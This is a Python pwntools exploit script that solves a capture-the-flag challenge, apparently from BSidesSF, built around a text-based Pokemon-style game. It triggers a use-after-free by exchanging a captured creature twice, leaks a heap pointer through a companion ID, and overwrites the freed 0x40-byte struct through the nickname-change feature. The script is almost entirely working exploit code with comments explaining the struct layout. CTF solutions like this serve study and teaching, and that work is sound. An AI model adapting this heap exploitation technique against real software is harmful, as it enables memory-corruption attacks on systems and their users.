#!/usr/bin/env python3
from pwn import *

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = remote('logemall-a2db138b.challenges.bsidessf.net', 666)

PRINT = args.PRINT

def recvuntil(s, drop=False):
    d = io.recvuntil(s, drop=drop)
    if PRINT:
        print(d.decode('ascii', 'ignore'))
    return d

def execute_command(c):
    io.info('sending %s' % c)
    recvuntil('Action > ')
    io.sendline(c)

def execute_x(direction, steps):
    for x in range(0, steps):
        execute_command(direction)

def go_left(steps):
    execute_x('a', steps)

def go_right(steps):
    execute_x('d', steps)

def go_down(steps):
    execute_x('s', steps)

def go_up(steps):
    execute_x('w', steps)

def confirm_yn():
    io.info('confirm')
    recvuntil((b'[y/N]', b'[Y/n]'))
    io.sendline('y')

def press_enter_to_continue():
    io.info('enter to continue')
    recvuntil('to continue>')
    io.sendline('')

def fly(map):
    execute_command('fly ' + map)

def fight(expected_enemy):
    execute_command('fight')
    data = recvuntil('gets ready!')
    assert expected_enemy.encode() in data, "%s not in %s" % (expected_enemy, data)
    press_enter_to_continue()

def attack_until_win_and_exchange_pokemon():
    while True:
        execute_command('a')
        press_enter_to_continue()
        data = io.recvlines(4)
        if PRINT:
            print((b"\n".join(data)).decode('ascii', 'ignore'))
        if "victorious!".encode() in data[3]:
            confirm_yn()
            return

def attack(steps):
    for x in range(0, steps):
        execute_command('a')
        press_enter_to_continue()

def get_heap_address_from_companion():
    recvuntil('Companion: \n[')
    data = recvuntil(']', drop=True)
    heap_address = int(data)
    success('Heap address: %d' % heap_address)
    return heap_address

def change_name_to(new_name):
    info('Changing name to %s' % new_name)
    assert b'\n' not in new_name, new_name
    assert b'\x0A' not in new_name, new_name
    assert len(new_name) <= 0x3F or (len(new_name) == 0x40 and new_name[0x3F] == 0), len(new_name)
    go_left(1)
    recvuntil('A weird man stands here...')
    recvuntil('Would you like him to rate your name?')
    confirm_yn()
    recvuntil('is it? That is a decent nickname!')
    recvuntil('give you a nicer nickname? How about it?')
    confirm_yn()
    recvuntil('Fine! What would you like your nickname to be?')
    recvuntil('>')
    io.sendline(new_name)
    recvuntil('So you want to change')
    confirm_yn()
    recvuntil('a better name than before!')

def run_until_successfully_escaped():
    has_escaped = False
    while not has_escaped:
        execute_command('run')
        has_escaped = b'You got away!' in io.recvuntil((b'You try to escape but fail!', b'You got away!'))
        press_enter_to_continue()


def start_fights_until_escaped_from(enemy_name):
    info('Starting fight until escaped from %s' % enemy_name)
    has_met_asciimon = False
    while not has_met_asciimon:
        execute_command('fight')
        press_enter_to_continue()
        data = recvuntil('(Hint: press <enter> to re-run previous command)')
        has_met_asciimon = b'Enemy ' + enemy_name in data
        run_until_successfully_escaped()


try:
    # Choose name
    io.sendlineafter('> ', 'foens')

    # Choose starting pokemon
    io.sendlineafter('Choices: Plant Frog, Fire Lizard, Water Turtle\n', 'Plant Frog')
    confirm_yn()

    # Use hidden commands
    execute_command('encounters show')
    execute_command('encounters off')

    # Go next to the name rater
    go_left(7)
    press_enter_to_continue()  # Open door
    go_left(3)
    fly('deepblue')
    go_down(6)
    go_left(1)

    # Fight, win and exchange 'Pitcher Plant' two times
    # This creates a use-after-free situtation
    fight('Enraged Pony draws near')  # Not the pokemon we want to fight
    execute_command('run')
    press_enter_to_continue()  # ran away
    fight('A Normal Pitcher Plant')
    attack_until_win_and_exchange_pokemon()
    fight('A Timid Pitcher Plant')
    attack_until_win_and_exchange_pokemon()
    # At this point, the 'Pitcher Plant' is being used, but is also freed.
    # Asciimons has been malloced using malloc(0x40)
    # When talking to the name rater, you can change your name.
    # This will malloc(0x40) for your name. Perfect match!

    # We are now in a used after free. We can get a heap pointer
    # by looking at the ID of our pokemon.
    # It contains the first 4 bytes of a the heap free-list pointer
    # The last 4 bytes are assumed zero
    heap_addr = get_heap_address_from_companion()

    # Change name to create a pokemon of id 'x'
    # Start a fight and run from it, such that we have seen it
    for x in range(1, 152):
        # Argh 'Caterpillar' with id '10' will end up trying
        # to change its name to '\n' which will stop
        # the reading of the name!
        # However, the pokemon can be found in Veridian Forest.
        # Fastest way to get there: 'fly gray', go down
        # Veridian Forest

        if x == 10:  # Cannot handle '\n' for the 'Caterpillar'
            continue
        asciimon_name = str(x).encode()
        while len(asciimon_name) < 31:
            asciimon_name += b'A'
        hp = 10000
        attack = 1
        defence = 1000
        speed = 1000
        is_used_by_player = 1  # Must be set to one, or asciiart is free'd when map is changed
                               # which causes a crash
        # An Asciimon looks like this:
        # struct Asciimon {
        #     int id_0x0;
        #     char name_0x4[32];
        #     int hp_0x24;
        #     int attack_0x28;
        #     int defense_0x2c;
        #     int speed_0x30;
        #     int isUsedByPlayer_0x34;        <!----- This is set to 1 when we win a fight
        #     char* asciiart_0x38;
        # };
        new_name = (p32(x) + asciimon_name + b'\x00' + p32(hp) + p32(attack) + p32(defence)
                    + p32(speed) + p32(is_used_by_player) + p64(heap_addr))

        change_name_to(new_name)
        start_fights_until_escaped_from(asciimon_name)
        change_name_to(new_name)  # Because of the ordering of free/malloc, we need to change the name again

    # Now lets find that Caterpillar
    fly('gray')
    go_down(3)
    go_left(6)
    go_down(6)
    start_fights_until_escaped_from(b'Caterpillar')

    # Get back to the professor to get the flag
    go_up(5)
    fly('colour')
    go_right(16)
    go_up(3)

    # Step through first conversation with the professor
    press_enter_to_continue()
    press_enter_to_continue()
    press_enter_to_continue()
    press_enter_to_continue()
    press_enter_to_continue()

    # Go to the professor again
    PRINT = True  # Lets print output from now
    go_up(1)
    press_enter_to_continue()


except KeyboardInterrupt:  # CTRL+C anytime to escape to interactive
    pass

io.interactive()
